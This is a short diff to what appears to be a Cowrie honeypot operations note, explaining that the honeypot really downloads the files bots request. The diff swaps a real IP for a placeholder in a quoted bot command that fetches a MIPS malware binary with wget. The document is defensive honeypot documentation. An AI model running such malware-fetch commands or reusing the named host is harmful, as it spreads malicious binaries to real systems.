@@ -841,7 +841,7 @@ reproduce that, so the fix belongs here rather than only in the incident note.
 ### Why
 
 Cowrie's `wget`, `curl` and `tftp` are not simulations. When a bot types
-`wget http://45.32.215.222/iran.mips`, Cowrie fetches that file for real and
+`wget http://<payload-host>/iran.mips`, Cowrie fetches that file for real and
 stores it under its SHA-256 in `var/lib/cowrie/downloads/`. That is how
 honeypots collect malware samples and it is on by default. Between 25 and
 29 September 2026 it produced **81 successful fetches and 72 failures — 153
